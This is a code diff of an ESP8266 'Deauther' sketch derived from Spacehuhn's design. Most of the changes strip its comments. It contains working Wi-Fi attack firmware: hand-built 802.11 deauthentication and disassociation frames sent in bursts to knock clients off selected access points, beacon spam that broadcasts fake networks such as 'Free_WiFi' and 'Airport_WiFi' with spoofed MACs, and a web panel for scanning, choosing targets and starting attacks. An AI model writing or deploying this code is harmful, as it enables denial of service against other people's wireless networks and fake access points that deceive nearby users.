@@ -12,13 +12,7 @@
 
 extern "C" {
   #include "user_interface.h"
-  // ONLY works on ESP8266 Arduino Core 2.7.4
-  // Board Manager URL: https://arduino.esp8266.com/stable/package_esp8266com_index.json
-  // Install version 2.7.4 specifically
   int wifi_send_pkt_freedom(uint8_t *buf, int len, bool sys_seq);
-  void wifi_set_opmode(uint8 opmode);
-  void wifi_set_channel(uint8 channel);
-  void wifi_promiscuous_enable(uint8 promiscuous);
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -31,46 +25,29 @@ extern "C" {
 #define MAX_SSID_NUM 20
 #define SSID_MAX_LEN 33
 #define EEPROM_MAGIC 0xBB
-#define DEAUTH_REASON 7   // Class 3 frame received from nonassociated station
+#define DEAUTH_REASON 7
 
 // ─────────────────────────────────────────────────────────────
-// SPACEHUHN EXACT PACKET STRUCTURES
-// Source: esp8266_deauther/Attack.cpp lines 1-80
+// PACKET STRUCTURES
 // ─────────────────────────────────────────────────────────────
-
-// Deauth frame — exact bytes from Spacehuhn source
-// 802.11 management frame type 0xC0 (deauth) or 0xA0 (disassoc)
 uint8_t deauth_frame[26] = {
-  /* FC       */ 0xC0, 0x00,
-  /* Duration */ 0x00, 0x00,
-  /* DA       */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // broadcast (all stations)
-  /* SA/BSSID */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // filled from scanned AP
-  /* BSSID    */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // filled from scanned AP
-  /* Seq Ctrl */ 0x00, 0x00,
-  /* Reason   */ 0x07, 0x00   // reason 7 = deauth because STA is leaving BSS
+  0xC0, 0x00,
+  0x00, 0x00,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00,
+  0x07, 0x00
 };
 
 uint8_t disassoc_frame[26] = {
-  /* FC       */ 0xA0, 0x00,
-  /* Duration */ 0x00, 0x00,
-  /* DA       */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  /* SA/BSSID */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  /* BSSID    */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-  /* Seq Ctrl */ 0x00, 0x00,
-  /* Reason   */ 0x07, 0x00
-};
-
-// Beacon frame — exact structure from Spacehuhn
-// 802.11 management frame type 0x80 (beacon)
-// Spacehuhn uses a fixed base then appends SSID IE dynamically
-static const uint8_t beacon_hdr[] = {
-  /* FC       */ 0x80, 0x00,
-  /* Duration */ 0x00, 0x00,
-  /* DA  bcast*/ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-  /* SA       */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // spoofed MAC (modified per beacon)
-  /* BSSID    */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
-  /* Seq Ctrl */ 0x00, 0x00
-  // body follows: timestamp(8), interval(2), capability(2), then IEs
+  0xA0, 0x00,
+  0x00, 0x00,
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00,
+  0x07, 0x00
 };
 
 // ─────────────────────────────────────────────────────────────
@@ -92,8 +69,8 @@ int       ssidCount   = 0;
 
 bool      deauthRunning  = false;
 bool      beaconRunning  = false;
-int       deauthCurrent  = 0;   // which AP we are currently deauthing
-int       beaconCurrent  = 0;   // which SSID we are currently beaconing
+int       deauthCurrent  = 0;
+int       beaconCurrent  = 0;
 uint8_t   beaconChannel  = 1;
 uint32_t  deauthTimer    = 0;
 uint32_t  beaconTimer    = 0;
@@ -111,10 +88,9 @@ void saveSSIDs() {
   EEPROM.write(0, EEPROM_MAGIC);
   EEPROM.write(1, (uint8_t)ssidCount);
   int addr = 2;
-  for (int i = 0; i < ssidCount; i++) {
+  for (int i = 0; i < ssidCount; i++)
     for (int j = 0; j < SSID_MAX_LEN; j++)
       EEPROM.write(addr++, ssidList[i][j]);
-  }
   EEPROM.commit();
 }
 
@@ -131,32 +107,23 @@ void loadSSIDs() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// SPACEHUHN DEAUTH LOGIC (exact from Attack.cpp)
-// sendDeauth(bssid, channel, pkts) →
-//   - set channel
-//   - copy bssid into SA and BSSID fields of frame
-//   - send deauth + disassoc back to back N times
-//   - increment seq number each send
+// DEAUTH
 // ─────────────────────────────────────────────────────────────
 void sendDeauth(uint8_t *bssid, uint8_t ch, int packets) {
   wifi_set_channel(ch);
-
-  // Fill SA (bytes 10-15) and BSSID (bytes 16-21)
-  memcpy(&deauth_frame[10],  bssid, 6);
-  memcpy(&deauth_frame[16],  bssid, 6);
+  memcpy(&deauth_frame[10],   bssid, 6);
+  memcpy(&deauth_frame[16],   bssid, 6);
   memcpy(&disassoc_frame[10], bssid, 6);
   memcpy(&disassoc_frame[16], bssid, 6);
 
   for (int i = 0; i < packets; i++) {
-    // Sequence number — 12-bit counter, little endian in bits 4-15 of seq field
     uint16_t seq = (seqNum << 4) & 0xFFF0;
-    deauth_frame[22]  = seq & 0xFF;
-    deauth_frame[23]  = seq >> 8;
+    deauth_frame[22]   = seq & 0xFF;
+    deauth_frame[23]   = seq >> 8;
     disassoc_frame[22] = seq & 0xFF;
     disassoc_frame[23] = seq >> 8;
     seqNum = (seqNum + 1) & 0xFFF;
-
-    wifi_send_pkt_freedom(deauth_frame,  sizeof(deauth_frame),  0);
+    wifi_send_pkt_freedom(deauth_frame,   sizeof(deauth_frame),   0);
     delayMicroseconds(500);
     wifi_send_pkt_freedom(disassoc_frame, sizeof(disassoc_frame), 0);
     delayMicroseconds(500);
@@ -164,86 +131,44 @@ void sendDeauth(uint8_t *bssid, uint8_t ch, int packets) {
 }
 
 // ─────────────────────────────────────────────────────────────
-// SPACEHUHN BEACON LOGIC (exact from Attack.cpp)
-// buildBeacon(ssid, ch) →
-//   - 24-byte 802.11 header
-//   - 8-byte timestamp (micros64)
-//   - 2-byte beacon interval (100 TU = 0x6400)
-//   - 2-byte capability info (0x0401 = ESS + short preamble)
-//   - IE 0x00: SSID
-//   - IE 0x01: Supported Rates [82 84 8B 96 0C 12 24 48]
-//   - IE 0x03: DS Parameter (channel)
-//   - IE 0x05: TIM (Traffic Indication Map)
+// BEACON
 // ─────────────────────────────────────────────────────────────
 void sendBeacon(const char *ssid, uint8_t ch, bool wpa) {
   uint8_t ssidLen = strlen(ssid);
-  // Frame: 24 (hdr) + 8 (ts) + 2 (interval) + 2 (cap) +
-  //        2+ssidLen (ssid IE) + 10 (rates IE) + 3 (ds IE) + 6 (tim IE)
   int frameLen = 24 + 8 + 2 + 2 + 2 + ssidLen + 10 + 3 + 6;
   uint8_t pkt[frameLen];
   memset(pkt, 0, frameLen);
 
-  // 802.11 MAC header (24 bytes)
-  pkt[0] = 0x80; pkt[1] = 0x00;         // Frame Control: beacon
-  pkt[2] = 0x00; pkt[3] = 0x00;         // Duration
-  // DA: broadcast
+  pkt[0]=0x80; pkt[1]=0x00;
+  pkt[2]=0x00; pkt[3]=0x00;
   pkt[4]=0xFF; pkt[5]=0xFF; pkt[6]=0xFF;
   pkt[7]=0xFF; pkt[8]=0xFF; pkt[9]=0xFF;
-  // SA: spoofed MAC — Spacehuhn generates from SSID so each SSID has unique MAC
-  pkt[10] = 0x0A;
-  pkt[11] = (uint8_t)(ssid[0]);
-  pkt[12] = (uint8_t)(ssidLen);
-  pkt[13] = (uint8_t)(ssid[ssidLen > 1 ? 1 : 0] + ch);
-  pkt[14] = (uint8_t)(ch * 3);
-  pkt[15] = 0x00;
-  memcpy(&pkt[16], &pkt[10], 6);  // BSSID = SA
-  // Seq ctrl
+  pkt[10]=0x0A;
+  pkt[11]=(uint8_t)(ssid[0]);
+  pkt[12]=(uint8_t)(ssidLen);
+  pkt[13]=(uint8_t)(ssid[ssidLen > 1 ? 1 : 0] + ch);
+  pkt[14]=(uint8_t)(ch * 3);
+  pkt[15]=0x00;
+  memcpy(&pkt[16], &pkt[10], 6);
   uint16_t seq = (seqNum << 4) & 0xFFF0;
   pkt[22] = seq & 0xFF;
   pkt[23] = seq >> 8;
   seqNum = (seqNum + 1) & 0xFFF;
 
   int pos = 24;
-
-  // Timestamp (8 bytes) — μs since boot
   uint64_t ts = micros64();
   memcpy(&pkt[pos], &ts, 8); pos += 8;
-
-  // Beacon interval: 100 TU = 0x0064 little endian
-  pkt[pos++] = 0x64; pkt[pos++] = 0x00;
-
-  // Capability info: ESS (0x0001) + Short Preamble (0x0020) = 0x0021
-  // Spacehuhn uses 0x0431 for WPA, 0x0021 for open
+  pkt[pos++]=0x64; pkt[pos++]=0x00;
   uint16_t cap = wpa ? 0x0431 : 0x0021;
-  pkt[pos++] = cap & 0xFF;
-  pkt[pos++] = cap >> 8;
-
-  // IE 0: SSID
-  pkt[pos++] = 0x00;
-  pkt[pos++] = ssidLen;
+  pkt[pos++]=cap & 0xFF; pkt[pos++]=cap >> 8;
+  pkt[pos++]=0x00; pkt[pos++]=ssidLen;
   memcpy(&pkt[pos], ssid, ssidLen); pos += ssidLen;
-
-  // IE 1: Supported Rates (8 rates — exact from Spacehuhn)
-  pkt[pos++] = 0x01; pkt[pos++] = 0x08;
-  pkt[pos++] = 0x82; // 1 Mbps  (basic)
-  pkt[pos++] = 0x84; // 2 Mbps  (basic)
-  pkt[pos++] = 0x8B; // 5.5 Mbps(basic)
-  pkt[pos++] = 0x96; // 11 Mbps (basic)
-  pkt[pos++] = 0x0C; // 6 Mbps
-  pkt[pos++] = 0x12; // 9 Mbps
-  pkt[pos++] = 0x24; // 18 Mbps
-  pkt[pos++] = 0x48; // 36 Mbps
-
-  // IE 3: DS Parameter Set (current channel)
-  pkt[pos++] = 0x03; pkt[pos++] = 0x01;
-  pkt[pos++] = ch;
-
-  // IE 5: TIM (Traffic Indication Map)
-  pkt[pos++] = 0x05; pkt[pos++] = 0x04;
-  pkt[pos++] = 0x00; // DTIM count
-  pkt[pos++] = 0x01; // DTIM period
-  pkt[pos++] = 0x00; // bitmap ctrl
-  pkt[pos++] = 0x00; // partial virtual bitmap
+  pkt[pos++]=0x01; pkt[pos++]=0x08;
+  pkt[pos++]=0x82; pkt[pos++]=0x84; pkt[pos++]=0x8B; pkt[pos++]=0x96;
+  pkt[pos++]=0x0C; pkt[pos++]=0x12; pkt[pos++]=0x24; pkt[pos++]=0x48;
+  pkt[pos++]=0x03; pkt[pos++]=0x01; pkt[pos++]=ch;
+  pkt[pos++]=0x05; pkt[pos++]=0x04;
+  pkt[pos++]=0x00; pkt[pos++]=0x01; pkt[pos++]=0x00; pkt[pos++]=0x00;
 
   wifi_set_channel(ch);
   wifi_send_pkt_freedom(pkt, pos, 0);
@@ -253,35 +178,29 @@ void sendBeacon(const char *ssid, uint8_t ch, bool wpa) {
 // SCAN
 // ─────────────────────────────────────────────────────────────
 void doScan() {
-  // Spacehuhn: mode STATION for scan, then back to SOFTAP_STA
   WiFi.mode(WIFI_STA);
   WiFi.disconnect();
   delay(100);
-
   int n = WiFi.scanNetworks(false, true);
   apCount = 0;
-
   for (int i = 0; i < n && apCount < MAX_AP_NUM; i++) {
-    aps[apCount].channel = WiFi.channel(i);
-    aps[apCount].rssi    = WiFi.RSSI(i);
-    aps[apCount].encType = WiFi.encryptionType(i);
+    aps[apCount].channel  = WiFi.channel(i);
+    aps[apCount].rssi     = WiFi.RSSI(i);
+    aps[apCount].encType  = WiFi.encryptionType(i);
     aps[apCount].selected = false;
     String s = WiFi.SSID(i);
     s.toCharArray(aps[apCount].ssid, SSID_MAX_LEN);
     memcpy(aps[apCount].bssid, WiFi.BSSID(i), 6);
     apCount++;
   }
-
   WiFi.scanDelete();
-
-  // Restore AP mode
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAPConfig(AP_IP_ADDR, AP_IP_ADDR, IPAddress(255,255,255,0));
   WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
 }
 
 // ─────────────────────────────────────────────────────────────
-// HTML COMPONENTS
+// HTML
 // ─────────────────────────────────────────────────────────────
 const char CSS[] PROGMEM = R"CSS(
 *{margin:0;padding:0;box-sizing:border-box}
@@ -382,11 +301,9 @@ int rssiPct(int rssi) {
 // ─────────────────────────────────────────────────────────────
 void pageScan() {
   String pg = pageTop("Scan","scan");
-
   if (apCount > 0) {
     int sel = 0;
     for (int i=0;i<apCount;i++) if(aps[i].selected) sel++;
-
     pg += "<div class='card'>";
     if (sel > 0) pg += "<div class='banner banner-ok'>&#x2714; " + String(sel) + " target(s) selected</div>";
     pg += "<div class='card-title'>&#x1F4E1; Scan Results (" + String(apCount) + " networks)</div>";
@@ -412,7 +329,6 @@ void pageScan() {
       "<button class='btn btn-primary' type='submit'>&#x2714; Apply Selection</button>"
       "</form></div>");
   }
-
   pg += F("<div class='card'>"
     "<div class='card-title'>&#x1F50D; Scanner</div>"
     "<form method='POST' action='/scan'>"
@@ -423,7 +339,6 @@ void pageScan() {
     "</select></div>"
     "<button class='btn btn-primary' type='submit'>&#x1F50D; Start Scan</button>"
     "</form></div>");
-
   pg += pageBot();
   server.send(200,"text/html",pg);
 }
@@ -451,19 +366,14 @@ void handleSelect() {
 // ─────────────────────────────────────────────────────────────
 void pageAttack() {
   String pg = pageTop("Attack","attack");
-
   int selCount = 0;
   for (int i=0;i<apCount;i++) if(aps[i].selected) selCount++;
-
   if (deauthRunning)
-    pg += F("<div class='banner banner-err'><span class='dot dot-on'></span>DEAUTH RUNNING — Sending frames continuously</div>");
+    pg += F("<div class='banner banner-err'><span class='dot dot-on'></span>DEAUTH RUNNING</div>");
   else
     pg += F("<div class='banner banner-info'><span class='dot dot-off'></span>DEAUTH STOPPED</div>");
-
   if (selCount == 0) {
-    pg += F("<div class='card'>"
-      "<div class='banner banner-err'>No targets selected. Scan first and select APs.</div>"
-      "</div>");
+    pg += F("<div class='card'><div class='banner banner-err'>No targets selected. Scan first.</div></div>");
   } else {
     pg += "<div class='card'><div class='card-title'>&#x1F3AF; Targets (" + String(selCount) + ")</div>"
           "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>Signal</th></tr>";
@@ -476,7 +386,6 @@ void pageAttack() {
     }
     pg += F("</table></div>");
   }
-
   pg += F("<div class='card'><div class='card-title'>&#x26A1; Deauth Control</div>"
     "<div class='g2'>"
     "<form method='POST' action='/attack/start'>"
@@ -499,18 +408,17 @@ void pageAttack() {
       "<button class='btn btn-muted' type='submit'>&#x25A0; Stop Deauth</button>"
     "</form>"
     "</div></div>");
-
   pg += pageBot();
   server.send(200,"text/html",pg);
 }
 
-int   attackPkts     = 10;
-int   attackInterval = 100;
+int attackPkts     = 10;
+int attackInterval = 100;
 
 void handleAttackStart() {
   attackPkts     = server.arg("pkts").toInt();
   attackInterval = server.arg("interval").toInt();
-  if (attackPkts <= 0) attackPkts = 10;
+  if (attackPkts <= 0)     attackPkts = 10;
   if (attackInterval <= 0) attackInterval = 100;
   deauthRunning = true;
   deauthCurrent = 0;
@@ -529,12 +437,10 @@ void handleAttackStop() {
 // ─────────────────────────────────────────────────────────────
 void pageBeacon() {
   String pg = pageTop("Beacon","beacon");
-
   if (beaconRunning)
-    pg += F("<div class='banner banner-ok'><span class='dot dot-on'></span>BEACON RUNNING — Fake APs broadcasting</div>");
+    pg += F("<div class='banner banner-ok'><span class='dot dot-on'></span>BEACON RUNNING</div>");
   else
     pg += F("<div class='banner banner-info'><span class='dot dot-off'></span>BEACON STOPPED</div>");
-
   pg += F("<div class='card'><div class='card-title'>&#x1F4DD; Fake SSID List</div>"
     "<form method='POST' action='/beacon/save'>"
     "<div class='g3'>");
@@ -547,7 +453,6 @@ void pageBeacon() {
   pg += F("</div>"
     "<button class='btn btn-primary' type='submit'>&#x1F4BE; Save to EEPROM</button>"
     "</form></div>");
-
   pg += F("<div class='card'><div class='card-title'>&#x1F4F6; Beacon Control</div>"
     "<div class='g2'>"
     "<form method='POST' action='/beacon/start'>"
@@ -562,7 +467,6 @@ void pageBeacon() {
       "<button class='btn btn-muted' type='submit'>&#x25A0; Stop</button>"
     "</form>"
     "</div></div>");
-
   pg += pageBot();
   server.send(200,"text/html",pg);
 }
@@ -575,9 +479,8 @@ void handleBeaconSave() {
     if (server.argName(i) == "ssid") {
       String v = server.arg(i);
       v.trim();
-      if (v.length() > 0) {
+      if (v.length() > 0)
         v.substring(0, SSID_MAX_LEN-1).toCharArray(ssidList[ssidCount++], SSID_MAX_LEN);
-      }
     }
   }
   saveSSIDs();
@@ -613,7 +516,6 @@ void pageSettings() {
       "<tr><td style='color:#6c7086'>Admin IP</td><td>192.168.4.1</td></tr>"
       "<tr><td style='color:#6c7086'>Author</td><td>admin@mohasin.bro.bd</td></tr>"
     "</table></div>");
-
   pg += F("<div class='card'><div class='card-title'>&#x26A0; Troubleshooting</div>"
     "<table>"
       "<tr><td style='color:#6c7086'>Deauth not working?</td><td>Confirm Core = 2.7.4 (not 3.x)</td></tr>"
@@ -621,14 +523,12 @@ void pageSettings() {
       "<tr><td style='color:#6c7086'>Compile error?</td><td>user_interface.h missing = wrong core</td></tr>"
       "<tr><td style='color:#6c7086'>AP disappears?</td><td>Scan resets mode — reopen 192.168.4.1</td></tr>"
     "</table></div>");
-
   pg += F("<div class='card'><div class='card-title'>&#x1F527; Actions</div>"
     "<div style='display:flex;gap:10px;flex-wrap:wrap'>"
     "<form method='POST' action='/reboot'>"
       "<button class='btn btn-danger' type='submit'>&#x21BA; Reboot ESP</button>"
     "</form>"
     "</div></div>");
-
   pg += pageBot();
   server.send(200,"text/html",pg);
 }
@@ -652,11 +552,8 @@ void handleCaptive() {
 void setup() {
   Serial.begin(115200);
   Serial.println(F("\n[CSM] Booting Deauther v2..."));
-
   EEPROM.begin(EEPROM_SIZE);
   loadSSIDs();
-
-  // Default SSIDs if first boot
   if (ssidCount == 0) {
     const char *def[] = {
       "Free_WiFi","Airport_WiFi","Hotel_Guest","Starbucks",
@@ -669,16 +566,10 @@ void setup() {
     for (int i=0;i<ssidCount;i++)
       strncpy(ssidList[i], def[i], SSID_MAX_LEN-1);
   }
-
-  // AP mode — Spacehuhn: use WIFI_AP_STA so scan still works
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAPConfig(AP_IP_ADDR, AP_IP_ADDR, IPAddress(255,255,255,0));
   WiFi.softAP(ADMIN_SSID, ADMIN_PASS);
-
-  // Wildcard DNS for captive portal
   dns.start(53, "*", AP_IP_ADDR);
-
-  // Routes
   server.on("/",              HTTP_GET,  pageScan);
   server.on("/scan",          HTTP_POST, handleScan);
   server.on("/select",        HTTP_POST, handleSelect);
@@ -692,60 +583,42 @@ void setup() {
   server.on("/settings",      HTTP_GET,  pageSettings);
   server.on("/reboot",        HTTP_POST, handleReboot);
   server.onNotFound(handleCaptive);
-
   server.begin();
-
-  // Spacehuhn: disable promiscuous before attacks, enable only during scan
   wifi_promiscuous_enable(0);
-
-  Serial.println(F("[CSM] Ready. Connect to 'CSM Mohasin' → 192.168.4.1"));
+  Serial.println(F("[CSM] Ready. Connect to 'CSM Mohasin' -> 192.168.4.1"));
 }
 
 // ─────────────────────────────────────────────────────────────
-// MAIN LOOP — Spacehuhn pattern:
-// handleClient() → check attack timer → send burst → next AP
-// check beacon timer → send one beacon → next SSID
+// LOOP
 // ─────────────────────────────────────────────────────────────
 void loop() {
   dns.processNextRequest();
   server.handleClient();
 
-  // ── Deauth loop ──
-  // Spacehuhn cycles through selected APs one at a time per interval
   if (deauthRunning && apCount > 0) {
     if (millis() - deauthTimer >= (uint32_t)attackInterval) {
       deauthTimer = millis();
-
-      // Find next selected AP
       int tried = 0;
       while (tried < apCount) {
         if (aps[deauthCurrent].selected) {
-          sendDeauth(
-            aps[deauthCurrent].bssid,
-            aps[deauthCurrent].channel,
-            attackPkts
-          );
+          sendDeauth(aps[deauthCurrent].bssid, aps[deauthCurrent].channel, attackPkts);
           deauthCurrent = (deauthCurrent + 1) % apCount;
           break;
         }
         deauthCurrent = (deauthCurrent + 1) % apCount;
         tried++;
       }
-      // If nothing selected, stop
       if (tried == apCount) deauthRunning = false;
     }
   }
 
-  // ── Beacon loop ──
-  // Spacehuhn: one beacon per 50ms, cycle all SSIDs, increment channel per full cycle
   if (beaconRunning && ssidCount > 0) {
     if (millis() - beaconTimer >= 50) {
       beaconTimer = millis();
       sendBeacon(ssidList[beaconCurrent], beaconChannel, beaconWPA);
       beaconCurrent = (beaconCurrent + 1) % ssidCount;
-      if (beaconCurrent == 0) {
+      if (beaconCurrent == 0)
         beaconChannel = (beaconChannel % 13) + 1;
-      }
     }
   }
 }
